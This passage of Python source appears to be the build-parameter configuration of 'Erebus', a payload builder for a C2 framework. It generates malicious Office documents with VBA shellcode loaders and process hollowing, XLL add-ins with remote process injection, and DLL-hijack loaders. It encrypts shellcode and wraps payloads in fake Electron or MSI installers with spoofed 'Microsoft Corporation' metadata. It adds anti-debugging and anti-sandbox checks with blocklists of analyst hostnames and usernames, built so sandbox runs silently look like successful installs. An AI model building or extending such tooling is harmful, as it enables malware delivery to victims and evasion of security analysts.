                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9f1 MalDoc Trigger Binary",
            parameter_type=BuildParameterType.String,
            description="Executable to run when the VBA trigger fires (Command Execution mode only).",
            default_value="C:\\Windows\\System32\\conhost.exe",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9f MalDoc Injection Type", operand=HideConditionOperand.NotEQ, value="Command Execution"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9f2 MalDoc Trigger Command",
            parameter_type=BuildParameterType.String,
            description="Arguments passed to the trigger binary (Command Execution mode only).",
            default_value="--headless cmd.exe /Q /c erebus.exe | decoy.pdf",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9f MalDoc Injection Type", operand=HideConditionOperand.NotEQ, value="Command Execution"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9g VBA Loader Technique",
            parameter_type=BuildParameterType.ChooseOne,
            description="VBA shellcode loader technique - VirtualAlloc (classic), EnumLocales (callback), QueueUserAPC (APC), ProcessHollowing (remote)",
            choices=["VirtualAlloc + CreateThread", "EnumSystemLocalesA Callback", "QueueUserAPC Injection", "Process Hollowing"],
            default_value="VirtualAlloc + CreateThread",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9f MalDoc Injection Type", operand=HideConditionOperand.EQ, value="Command Execution"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc"),
                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.NotEQ, value="VBA Macro")
            ]
        ),

        # XLL (Excel Add-In DLL) Parameters
        BuildParameter(
            name="0.9h XLL Payload Type",
            parameter_type=BuildParameterType.ChooseOne,
            description="Generate XLL (Excel Add-In DLL) instead of VBA macro - native DLL executed when Excel loads",
            choices=["VBA Macro", "XLL Add-In DLL"],
            default_value="VBA Macro",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9f MalDoc Injection Type", operand=HideConditionOperand.EQ, value="Command Execution"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9i XLL Injection Method",
            parameter_type=BuildParameterType.ChooseOne,
            description="Shellcode injection technique for XLL DLL - CreateThread (self), ProcessInject (remote)",
            choices=["CreateThread (In-Process)", "ProcessInject (Remote)"],
            default_value="CreateThread (In-Process)",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.EQ, value="VBA Macro"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9j XLL Target Process",
            parameter_type=BuildParameterType.String,
            description="Target process for remote injection (e.g., C:\\Windows\\System32\\notepad.exe)",
            default_value="C:\\Windows\\System32\\notepad.exe",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.EQ, value="VBA Macro"),
                HideCondition(name="0.9i XLL Injection Method", operand=HideConditionOperand.EQ, value="CreateThread (In-Process)"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9k XLL Compiler",
            parameter_type=BuildParameterType.ChooseOne,
            description="Windows compiler to use for XLL DLL compilation (requires Windows build system)",
            choices=["MSVC", "MinGW"],
            default_value="MSVC",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.EQ, value="VBA Macro"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9l XLL Guardrail Includes",
            parameter_type=BuildParameterType.String,
            description="Optional include block inserted before windows.h (e.g., #include <winsock2.h>)",
            default_value="",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.EQ, value="VBA Macro"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9m XLL Guardrail Code",
            parameter_type=BuildParameterType.String,
            description="Optional guardrail C/C++ code. Must define BOOL ErebusGuardrail(void) and return TRUE to execute.",
            default_value="",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.EQ, value="VBA Macro"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9n XLL Guardrail Extra Libs",
            parameter_type=BuildParameterType.String,
            description="Optional extra linker flags for XLL builds (e.g., -lws2_32)",
            default_value="",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.EQ, value="VBA Macro"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9o XLL Decoy XLSX",
            parameter_type=BuildParameterType.File,
            description="Optional custom XLSX used for XLL decoy arrays (XLSX/ZIP). Defaults to template.xlsx if not supplied.",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.EQ, value="VBA Macro"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9p MalDoc Output Format",
            parameter_type=BuildParameterType.ChooseOne,
            description=(
                "Output format for the VBA maldoc. "
                "All formats require erebus_helper on a Windows host (deferred via build_maldoc.bat). "
                "xlsm: macro-enabled workbook. xlsx: workbook saved as xlsm. xlam: Excel add-in. "
                "docm: Word macro-enabled document (Open XML). "
                "doc: Word 97-2003 binary format (build_maldoc.bat converts from docm via Word COM)."
            ),
            choices=["xlsm", "xlsx", "xlam", "docm", "doc"],
            default_value="xlsm",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.NotEQ, value="VBA Macro"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc"),
            ]
        ),

        BuildParameter(
            name = "0.13 Decoy File Inclusion",
            parameter_type = BuildParameterType.Boolean,
            description = "Check whether you want the decoy file in the final payload or not",
            default_value = False,
            required=True,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
            ]
        ),

        BuildParameter(
            name = "0.13 Decoy File",
            parameter_type = BuildParameterType.File,
            description = """Upload a decoy file (PDF/XLSX/etc.).
If one is not uploaded then an example file will be used.""",
            hide_conditions = [
                HideCondition(name="0.13 Decoy File Inclusion", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "1.0 DLL Hijacking",
            parameter_type = BuildParameterType.File,
            description = f"""Prepares a given DLL for proxy-based hijacking.
NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded or compressed payloads.
""",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
            ]
        ),

        BuildParameter(
            name = "1.0a Hijack Loader Architecture",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Select the target architecture for the DLL loader",
            choices = ["x64", "x86"],
            default_value = "x64",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
            ]
        ),

        BuildParameter(
            name = "1.0b Hijack Build Configuration",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Select the build configuration for the DLL hijack payload",
            choices = ["release", "debug"],
            default_value = "release",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
            ]
        ),

        # DLL Hijack Built-in Guardrails
        BuildParameter(
            name = "1.1 Use Built-in Guardrails",
            parameter_type = BuildParameterType.Boolean,
            description = "Use built-in anti-debugging and environment checks instead of custom code",
            default_value = False,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
            ]
        ),

        BuildParameter(
            name = "1.1a Check IsDebuggerPresent",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable check for IsDebuggerPresent and PEB.BeingDebugged flag",
            default_value = True,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        BuildParameter(
            name = "1.1b Check Remote Debugger",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable check for remote debugger via NtQueryInformationProcess",
            default_value = True,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        BuildParameter(
            name = "1.1c Check Debugger Processes",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable check for known debugger and analysis tool processes",
            default_value = True,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        BuildParameter(
            name = "1.1d Check Hardware Breakpoints",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable check for hardware breakpoints in debug registers",
            default_value = True,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        BuildParameter(
            name = "1.1e Check Timing Anomalies",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable timing-based debugger detection (RDTSC and Sleep checks)",
            default_value = False,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        BuildParameter(
            name = "1.1f Hostname Whitelist",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated list of allowed hostnames (e.g., TARGET-PC,VICTIM-WORKSTATION). Leave empty to disable.",
            default_value = "",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        BuildParameter(
            name = "1.1g Block Analysis Hostnames",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated list of blocked hostnames (e.g., SANDBOX,MALWARE-ANALYSIS,VM-WIN10)",
            default_value = "SANDBOX,MALWARE-ANALYSIS,VM-WIN10,ANALYST-PC",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        BuildParameter(
            name = "1.1h Block Analysis Usernames",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated list of blocked usernames (e.g., analyst,malware,sandbox,user,admin)",
            default_value = "analyst,malware,sandbox,user,admin",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        BuildParameter(
            name = "1.1i IP Whitelist",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated IP prefixes to allow (e.g., 10.,192.168.50.). Leave empty to disable.",
            default_value = "",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        BuildParameter(
            name = "1.1j IP Blacklist",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated IP prefixes to block (e.g., 192.168.122.,172.16.,127.)",
            default_value = "192.168.122.,172.16.,127.",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        BuildParameter(
            name = "1.1k Domain Whitelist",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated list of allowed domains (e.g., CORP.CONTOSO.COM,TARGET-DOMAIN.LOCAL). Leave empty to disable.",
            default_value = "",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        # Shellcrypt
        BuildParameter(
            name = "2.0 Compression Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose a compression type for the shellcode.",
            choices = [
                "LZNT1",
                "RLE",
                "NONE",
            ],
            default_value="NONE"
        ),

# TODO:
# Add more decryption support to loaders
        BuildParameter(
            name = "2.1 Encryption Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose an encryption type for the shellcode.",
            choices = [
                "AES_ECB",
                "AES_CBC",
                "RC4",
                "XOR",
            ],
            default_value = "RC4"
        ),

        BuildParameter(
            name = "2.2 Encryption Key",
            parameter_type = BuildParameterType.String,
            description = """Choose an encryption key. A random one will be
generated if none have been entered.""",
            default_value="NONE"
        ),

        BuildParameter(
            name = "2.3 Encoding Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose an encoding type for the shellcode.",
            choices = [
                "ALPHA32",
                "ASCII85",
                "BASE64",
                "WORDS256",
                "NONE",
            ],
            default_value="NONE"
        ),

        # Archive
        BuildParameter(
            name = "3.0 Container Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose the final payload container type.",
            choices = ["ISO", "7z", "Zip", "MSI", "Electron"],
            default_value = "Zip",
        ),

        # Electron fake-installer container parameters (hidden unless Electron selected)
        BuildParameter(
            name = "3.E0 Electron Product Name",
            parameter_type = BuildParameterType.String,
            description = "Display name shown in the fake installer window and NSIS metadata",
            default_value = "Acme Installer",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
            ]
        ),
        BuildParameter(
            name = "3.E1 Electron Publisher",
            parameter_type = BuildParameterType.String,
            description = "Publisher string embedded in the installer metadata",
            default_value = "Acme Corporation",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
            ]
        ),
        BuildParameter(
            name = "3.E2 Electron Version",
            parameter_type = BuildParameterType.String,
            description = "Product version embedded in the installer",
            default_value = "1.0.0",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
            ]
        ),
        BuildParameter(
            name = "3.E3 Electron Architecture",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Target architecture for the Electron NSIS installer",
            choices = ["x64", "ia32"],
            default_value = "x64",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
            ]
        ),
        BuildParameter(
            name = "3.E4 Electron Entry Format",
            parameter_type = BuildParameterType.ChooseOne,
            description = (
                "Which spawn mechanism the wizard uses at install time:\n"
                "exe = CreateProcess on the embedded loader exe (Shellcode Loader / ClickOnce)\n"
                "dll = rundll32.exe <dll>,<entry> (Shellcode Loader DLL format)\n"
                "xll = excel.exe /e <xll> (Shellcode Loader XLL format)"
            ),
            choices = ["exe", "dll", "xll"],
            default_value = "exe",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
            ]
        ),
        BuildParameter(
            name = "3.E5 Electron DLL Entry Point",
            parameter_type = BuildParameterType.String,
            description = "rundll32 entry point name (only used when Entry Format = dll)",
            default_value = "DllMain",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E4 Electron Entry Format", operand=HideConditionOperand.NotEQ, value="dll"),
            ]
        ),
        BuildParameter(
            name = "3.E7 Electron File Description",
            parameter_type = BuildParameterType.String,
            description = (
                "PE file description string shown on the Details tab of the "
                "exe's properties dialog (maps to package.json.description)."
            ),
            default_value = "Setup",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
            ]
        ),
        BuildParameter(
            name = "3.E8 Electron Copyright",
            parameter_type = BuildParameterType.String,
            description = (
                "Legal copyright string embedded in the PE resources "
                "(maps to electron-builder.yml.copyright)."
            ),
            default_value = "",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
            ]
        ),
        BuildParameter(
            name = "3.E6a Electron Custom Icon",
            parameter_type = BuildParameterType.File,
            description = (
                "Optional PNG to use as the fake-installer window + exe icon.\n"
                "If omitted, the default Erebus icon is used. Image should be "
                "square and at least 256x256; it is converted to a multi-size "
                "ICO at build time."
            ),
            required = False,
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
            ]
        ),
        BuildParameter(
            name = "3.E6b Electron Payload Zip",
            parameter_type = BuildParameterType.File,
            description = (
                "Optional ZIP containing a pre-built payload and/or DLL to use instead of\n"
                "the Mythic-compiled loader. The archive must contain erebus.exe, erebus.dll,\n"
                "and/or erebus.xll at its root. Files are extracted directly into payload/\n"
                "before containerisation, replacing any compiled output."
            ),
            required = False,
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
            ]
        ),

        BuildParameter(
            name = "3.E9 Enable Electron Guardrails",
            parameter_type = BuildParameterType.Boolean,
            description = (
                "Master switch for the Electron wrapper's anti-sandbox guardrails. "
                "When enabled, the wizard defers staging the loader tree to "
                "%TEMP%\\inst-<uuid> until after a dwell time, real user mouse "
                "movement, and every enabled environment check has passed."
            ),
            default_value = True,
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
            ]
        ),
        BuildParameter(
            name = "3.E9a Dwell Time (ms)",
            parameter_type = BuildParameterType.String,
            description = (
                "Minimum time (ms) the wizard must be visible before the Install "
                "button becomes actionable. Defeats rapid-click sandbox detonators. "
                "0 disables the dwell gate."
            ),
            default_value = "2500",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9b Require Mouse Movement",
            parameter_type = BuildParameterType.Boolean,
            description = (
                "Require a real mousemove event (non-zero movementX/Y delta) "
                "inside the wizard window before the Install button is enabled. "
                "Filters synthetic-event automation that clicks buttons without "
                "moving the pointer."
            ),
            default_value = True,
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9c Check Debugger",
            parameter_type = BuildParameterType.Boolean,
            description = (
                "Refuse to stage if a Node inspector / debugger is attached to "
                "the Electron main process at Install click time."
            ),
            default_value = True,
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9d Check Sandbox Env Vars",
            parameter_type = BuildParameterType.Boolean,
            description = (
                "Refuse to stage if environment variables from common sandbox "
                "frameworks are present (Sandboxie, Cuckoo, Joe Sandbox, etc.)."
            ),
            default_value = True,
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9e Check Default Bad Usernames",
            parameter_type = BuildParameterType.Boolean,
            description = (
                "Refuse to stage if the current username is a well-known sandbox "
                "default (sandbox, malware, analyst, WDAGUtilityAccount, ...)."
            ),
            default_value = True,
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9f Check Default Bad Hostnames",
            parameter_type = BuildParameterType.Boolean,
            description = (
                "Refuse to stage if the current hostname contains common sandbox "
                "substrings (sandbox, cuckoo, hybrid-analysis, vm, vbox, ...)."
            ),
            default_value = True,
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9g Hostname Whitelist",
            parameter_type = BuildParameterType.String,
            description = (
                "Comma-separated list of hostnames (or suffixes) that are ALLOWED "
                "to run the installer. Empty = no whitelist check."
            ),
            default_value = "",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9h Hostname Blocklist",
            parameter_type = BuildParameterType.String,
            description = (
                "Comma-separated list of hostnames that are BLOCKED from running "
                "the installer. Empty = no blocklist check."
            ),
            default_value = "",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9i Username Whitelist",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated list of allowed usernames. Empty = no whitelist check.",
            default_value = "",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9j Username Blocklist",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated list of blocked usernames. Empty = no blocklist check.",
            default_value = "",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9k Min Screen Width",
            parameter_type = BuildParameterType.String,
            description = (
                "Refuse to stage if the primary display's width is less than this "
                "many pixels. Sandboxes commonly run at 800x600 or 1024x768. "
                "0 disables the check."
            ),
            default_value = "1280",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9l Min Screen Height",
            parameter_type = BuildParameterType.String,
            description = "Refuse to stage if the primary display's height is less than this many pixels. 0 disables the check.",
            default_value = "720",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9m Min CPU Count",
            parameter_type = BuildParameterType.String,
            description = "Refuse to stage if the host has fewer than N logical CPUs (most sandbox VMs use 1-2). 0 disables.",
            default_value = "2",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9n Min Memory (MB)",
            parameter_type = BuildParameterType.String,
            description = "Refuse to stage if the host has less than N MB of RAM. 0 disables.",
            default_value = "2048",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9o Max Idle Seconds",
            parameter_type = BuildParameterType.String,
            description = "Refuse to stage if the system idle time is greater than this many seconds (unattended box = suspicious). 0 disables.",
            default_value = "0",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9p Pre-Spawn Delay (ms)",
            parameter_type = BuildParameterType.String,
            description = (
                "Sleep this many ms inside the Install handler AFTER every other "
                "guardrail has passed, before the file copy and spawn. Forces "
                "short-lived sandbox detonation windows to time out before "
                "anything hits disk. 0 disables."
            ),
            default_value = "0",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9q Guardrail Debug Mode",
            parameter_type = BuildParameterType.Boolean,
            description = (
                "TESTING ONLY. When True, guardrail failures are surfaced visibly: "
                "failure reasons are logged to the Electron console AND displayed "
                "as a red banner inside the wizard instead of silently advancing to "
                "Finish. Also logs which check blocked the install. NEVER SHIP WITH "
                "THIS ENABLED - it defeats the silent-failure property that makes "
                "sandbox detonations look like successful installs."
            ),
            default_value = False,
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name="3.1 Compression Level",
            parameter_type=BuildParameterType.ChooseOne,
            description="Select compression level (9 is max).",
            choices=["0", "1", "3", "5", "7", "9"],
            default_value="9",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="ISO"),
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
            ]
        ),

        BuildParameter(
            name="3.2 Archive Password",
            parameter_type=BuildParameterType.String,
            description="Optional password for the archive (leave empty for none).",
            default_value="",
            required=False,
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="ISO"),
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
            ]
        ),

        #ISO
        BuildParameter(
            name="4.0 ISO Volume ID",
            parameter_type=BuildParameterType.String,
            description="ISO Volume name seen in Explorer.",
            default_value="EREBUS",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="ISO")
            ]
        ),

        BuildParameter(
            name="4.1 ISO enable Autorun",
            parameter_type=BuildParameterType.Boolean,
            description="Enable Autorun for ISO",
            default_value=False,
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="ISO")
            ]
        ),

        BuildParameter(
            name="4.2 ISO Backdoor File",
            parameter_type=BuildParameterType.File,
            description="Backdoor an existing ISO",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="ISO")
            ]
        ),
        BuildParameter(
            name="5.0 MSI Product Name",
            parameter_type=BuildParameterType.String,
            description="Application name shown in MSI/UI",
            default_value="System Updater",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI")
            ]
        ),
        BuildParameter(
            name="5.1 MSI Manufacturer",
            parameter_type=BuildParameterType.String,
            description="Company name shown in MSI metadata",
            default_value="Microsoft Corporation",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI")
            ]
        ),
        BuildParameter(
            name="5.2 MSI Install Scope",
            parameter_type=BuildParameterType.ChooseOne,
            description="Machine=Admin Required (Program Files), User=No Admin (AppData)",
            choices=["User", "Machine"],
            default_value="User",
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI")
            ]
        ),

        BuildParameter(
            name="5.3 Enable MSI Backdoor",
            parameter_type=BuildParameterType.Boolean,
